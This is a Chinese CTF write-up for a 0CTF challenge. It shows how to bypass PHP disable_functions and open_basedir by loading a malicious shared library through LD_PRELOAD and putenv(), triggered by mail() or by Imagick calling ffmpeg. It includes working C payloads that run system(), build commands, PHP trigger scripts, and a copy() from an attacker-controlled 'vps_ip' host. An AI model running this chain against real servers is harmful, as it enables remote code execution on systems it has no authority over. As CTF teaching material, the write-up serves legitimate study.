> 原文链接: https://www.anquanke.com//post/id/175403 


# 深入浅出LD_PRELOAD &amp; putenv()


                                阅读量   
                                **432395**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">7</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p1.ssl.qhimg.com/t01440f56e8fd16a146.jpg)](https://p1.ssl.qhimg.com/t01440f56e8fd16a146.jpg)



## 前记

上周利用空余时间，做了一下0ctf，感觉这道bypass disable function的题目比较有趣，于是分析一下，有了此文



## 题目分析

拿到题目

```
Imagick is a awesome library for hackers to break `disable_functions`.
So I installed php-imagick in the server, opened a `backdoor` for you.
Let's try to execute `/readflag` to get the flag.
Open basedir: /var/www/html:/tmp/d4dabdbc73b87e364e29e60c60a92900
Hint: eval($_POST["backdoor"]);
```

题目给了3个信息：
- execute `/readflag` to get the flag
- Open basedir: /var/www/html:/tmp/d4dabdbc73b87e364e29e60c60a92900
- Hint: eval($_POST[“backdoor”]);
我们知道题目是有后门的，但是有`disable_functions`限制，所以我们首先查看一下phpinfo内容

```
pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail
```

过滤非常多，但思路非常清晰：<br>
1.bypass open basedir<br>
2.bypass disable functions<br>
3.execute readflag



## open basedir

我们做个简单的测试

```
php &gt; ini_set('open_basedir','/var/www/html');
php &gt; var_dump(scandir('/var/www/html'));
array(5) `{`
  [0]=&gt;
  string(1) "."
  [1]=&gt;
  string(2) ".."
  [2]=&gt;
  string(7) "hack.so"
  [3]=&gt;
  string(10) "index.html"
  [4]=&gt;
  string(23) "index.nginx-debian.html"
`}`
php &gt; var_dump(scandir('/tmp'));
bool(false)
```

即open basedir是用来限制访问目录的，我们看一下题目源代码

```
backdoor=readfile('index.php');
```

可以得到

```
&lt;?php
$dir = "/tmp/" . md5("$_SERVER[REMOTE_ADDR]");
mkdir($dir);
ini_set('open_basedir', '/var/www/html:' . $dir);
?&gt;
&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;style&gt;.pre `{`word-break: break-all;max-width: 500px;white-space: pre-wrap;`}`&lt;/style&gt;&lt;/head&gt;&lt;body&gt;
&lt;pre class="pre"&gt;&lt;code&gt;Imagick is a awesome library for hackers to break `disable_functions`.
So I installed php-imagick in the server, opened a `backdoor` for you.
Let's try to execute `/readflag` to get the flag.
Open basedir: &lt;?php echo ini_get('open_basedir');?&gt;

&lt;?php eval($_POST["backdoor"]);?&gt;
Hint: eval($_POST["backdoor"]);
&lt;/code&gt;&lt;/pre&gt;&lt;/body&gt;

```

题目也是使用了这样的限制，我们只能访问

```
/tmp/md5("$_SERVER[REMOTE_ADDR]);
/var/www/html

```

那么如何bypass open basedir与disable functions呢这里不难搜到这样一篇文章

```
https://www.tarlogic.com/en/blog/how-to-bypass-disable_functions-and-open_basedir/
```

文中提及，我们可以用`LD_PRELOAD`+`putenv`打一套组合拳，既能绕过open basedir，又能绕过disable functions



## LD_PRELOAD与putenv

这里我们先来看一下原理，首先什么是LD_PRELOAD？

google给出如下定义

```
LD_PRELOAD is an optional environmental variable containing one or more paths to shared libraries, or shared objects, that the loader will load before any other shared library including the C runtime library (libc.so) This is called preloading a library.
```

即LD_PRELOAD这个环境变量指定路径的文件，会在其他文件被调用前，最先被调用

而putenv可以设置环境变量

```
putenv ( string $setting ) : bool
```

添加 setting 到服务器环境变量。 环境变量仅存活于当前请求期间。 在请求结束时环境会恢复到初始状态。

同时该函数也未被过滤。那么我们可以有如下骚操作：

1.制作一个恶意shared libraries<br>
2.使用putenv设置LD_PRELOAD为恶意文件路径<br>
3.使用某个php函数，触发specific shared library<br>
4.成功进行RCE

[![](https://p2.ssl.qhimg.com/t01d7d64b87128f9404.png)](https://p2.ssl.qhimg.com/t01d7d64b87128f9404.png)

而既然要在php运行时被触发，那么势必选择一个非常常用的函数才行

那么怎么找到这个函数呢？



## 传统方式(hijacking function)

在已有的文章中显示，一般使用php`mail()`函数进行触发，我们简单分析一下

这里简单写个demo

```
&lt;?php
mail('','','','');
?&gt;
```

我们strace一下，可以看到运行这个脚本的时候，程序会启子进程来调用sendmail

```
execve("/usr/bin/php", ["php", "test.php"], [/* 20 vars */]) = 0
[pid 23864] execve("/bin/sh", ["sh", "-c", "/usr/sbin/sendmail -t -i "], [/* 20 vars */]) = 0
[pid 23865] execve("/usr/sbin/sendmail", ["/usr/sbin/sendmail", "-t", "-i"], [/* 20 vars */]) = 0
```

那么我们只要看一下sendmail使用了哪些函数

[![](https://p5.ssl.qhimg.com/t01c76b4a9b6bc50197.png)](https://p5.ssl.qhimg.com/t01c76b4a9b6bc50197.png)

有很多函数可以使用，这里可以选择geteuid()，然后我们编写自己的evil shared libraries：hack.c

```
#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
void payload() `{`
        system("ls / &gt; /tmp/sky");
`}`
int geteuid() 
`{`
    if (getenv("LD_PRELOAD") == NULL) `{` return 0; `}`
    unsetenv("LD_PRELOAD");
    payload();
`}`
```

然后编译一下

```
gcc -c -fPIC hack.c -o hack
gcc --share hack -o hack.so
```

然后我们运行脚本

```
&lt;?php
putenv("LD_PRELOAD=./hack.so");
mail('','','','');
?&gt;
```

[![](https://p0.ssl.qhimg.com/t01afcea293e08668c6.png)](https://p0.ssl.qhimg.com/t01afcea293e08668c6.png)

不难发现它执行了命令，然后可以发现/tmp目录下多了一个文件sky

```
root@sky:~# ls /tmp | grep sky
sky
```

我们查看一下

```
root@sky:~# cat /tmp/sky
bin
boot
dev
etc
home
lib
lib32
....
```

发现成功执行命令



## 改进版(hijack shared library)

但其实这个方法是将条件变得严苛了，我们干的事情局限于找到一个函数，然后对其进行注入

但实际上我们可以更加直接，我们先将sendmail进行删除

[![](https://p4.ssl.qhimg.com/t011363df8d77bc765d.png)](https://p4.ssl.qhimg.com/t011363df8d77bc765d.png)

如图所示现在已经没有了sendmail，但我们依旧可以进行rce，可使用如下文件sky.c

```
#define _GNU_SOURCE
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/types.h&gt;

__attribute__ ((__constructor__)) void angel (void)`{`
    unsetenv("LD_PRELOAD");
    system("ls");
`}`
```

其中`__attribute__ ((__constructor__))`有如下说明

```
1.It's run when a shared library is loaded, typically during program startup.
2.That's how all GCC attributes are; presumably to distinguish them from function calls.
3.The destructor is run when the shared library is unloaded, typically at program exit.
```

所以当我们最开始将evil shared library load上后，就会触发`__attribute__ ((__constructor__))`，从而达成我们rce的目的.



## 函数寻找

但本题中mail函数已被disable_functions限制，所以我们并不能按照上述模式进行攻击。那么我们要找到一个什么样的函数才能满足我们的条件呢？

从上述内容不难发现，我们必须找到一个能在运行时候启动子进程的函数才行，因为我们设置了环境变量，必须restart才能生效，所以如果能启动一个子进程，那么我们的设置的LD_PRELOAD就会加载我们的evil shared library.

这里我们发现题目提示

```
So I installed php-imagick in the server, opened a `backdoor` for you.
```

所以我们主要探究php-imagick到底能不能干类似的事情

我们阅读php-imagick源码

```
https://github.com/ImageMagick/ImageMagick
```

我们发现如下对应关系

[![](https://p0.ssl.qhimg.com/t018ee5e5eadefc3997.png)](https://p0.ssl.qhimg.com/t018ee5e5eadefc3997.png)

我们发现当文件是MPEG format时，程序会调用’ffmpeg’ program进行转换，而如下后缀都被认为成MPEG format

[![](https://p2.ssl.qhimg.com/t01b63cd8517778cd0f.png)](https://p2.ssl.qhimg.com/t01b63cd8517778cd0f.png)

我们测试一下.wmv

写出脚本

```
&lt;?php
$img = new Imagick('sky.wmv');
?&gt;
```

我们测试一下

```
execve("/usr/bin/php", ["php", "sky.php"], [/* 21 vars */]) = 0
[pid 25217] execve("/bin/sh", ["sh", "-c", ""ffmpeg" -v -1 -i "/tmp/magick-2"...], [/* 21 vars */]) = 0

```

可以发现的确成功启动了子进程，调用了ffmpeg

但是如果sky.wmv文件不存在时

```
execve("/usr/bin/php", ["php", "sky.php"], [/* 21 vars */]) = 0
```

则不会调用ffmpeg

所以也不难分析出，应该是有一步判断文件是否存在的操作，再会去进行调用相关程序进行解码转换的操作

所以如果想利用Imagick新起子进程，那么我们得先有后面的参数文件，当然这并不是什么难事。



## payload &amp; attack

那么只剩最后的攻击了，找到了可以起子进程的方式，只差构造evil shared library了

我们还是用之前的sky.c

```
#define _GNU_SOURCE
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/types.h&gt;

__attribute__ ((__constructor__)) void angel (void)`{`
    unsetenv("LD_PRELOAD");
    system("ls");
`}`
```

然后编译一下

```
gcc -c -fPIC sky.c -o sky
gcc --share sky -o sky.so
```

测试一下

```
&lt;?php
putenv("LD_PRELOAD=./sky.so");
$img = new Imagick('sky.wmv');
?&gt;
```

运行发现

```
root@sky:~# php sky.php
bin  boot  dev  etc  home  initrd.img  initrd.img.old  lib  lib32  lib64  lost+found  media  mnt  opt  proc  root  run  sbin  srv  sys    test  tmp  usr    var  vmlinuz  vmlinuz.old
PHP Fatal error:  Uncaught ImagickException: unable to open image `/tmp/magick-25528VpF8npGTawCz.pam': No such file or directory @ error/blob.c/OpenBlob/2712 in /root/sky.php:3
Stack trace:
#0 /root/sky.php(3): Imagick-&gt;__construct('sky.wmv')
#1 `{`main`}`
  thrown in /root/sky.php on line 3
```

我们成功的进行了列目录



## getflag

那么现在思路很清晰：

1.把我们的sky.so和sky.wmv上传到题目的/tmp/sandbox中

2.利用backdoor运行sky.php

3.在tmp目录读取重定向的结果

首先我们按照题目意思，调用/readflag

文件内容为

```
#define _GNU_SOURCE
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/types.h&gt;

__attribute__ ((__constructor__)) void angel (void)`{`
    unsetenv("LD_PRELOAD");
    system("/readflag &gt; /tmp/d4dabdbc73b87e364e29e60c60a92900/flag");
`}`
```

然后是上传文件，我们有很多种方法，这里可以使用

```
$upload = '/tmp/d4dabdbc73b87e364e29e60c60a92900/sky.so';
echo copy("http://vps_ip/sky.wmv", $upload);
```

[![](https://p3.ssl.qhimg.com/t01e50f6c5c30da0151.png)](https://p3.ssl.qhimg.com/t01e50f6c5c30da0151.png)

我们可以看到上传成功了

然后我们执行

```
putenv("LD_PRELOAD=/tmp/d4dabdbc73b87e364e29e60c60a92900/sky.so");
$img = new Imagick('/tmp/d4dabdbc73b87e364e29e60c60a92900/sky.wmv');
```

[![](https://p0.ssl.qhimg.com/t018261c88964a8a8e1.png)](https://p0.ssl.qhimg.com/t018261c88964a8a8e1.png)

可以看到flag已经打到了/tmp目录下

我们进行读取即可

[![](https://p3.ssl.qhimg.com/t017dc94e1a34356a45.png)](https://p3.ssl.qhimg.com/t017dc94e1a34356a45.png)



## 后记

这个题目还是比较有趣的，学习到了不少姿势~



## 参考链接

[https://shinmao.github.io/websecurity/2019/01/09/Bypass-disablefuncs-with-LDPRELOAD/](https://shinmao.github.io/websecurity/2019/01/09/Bypass-disablefuncs-with-LDPRELOAD/)<br>[https://www.tarlogic.com/en/blog/how-to-bypass-disable_functions-and-open_basedir/](https://www.tarlogic.com/en/blog/how-to-bypass-disable_functions-and-open_basedir/)<br>[https://github.com/ImageMagick/ImageMagick](https://github.com/ImageMagick/ImageMagick)<br>[https://blog.csdn.net/niexinming/article/details/52997496](https://blog.csdn.net/niexinming/article/details/52997496)
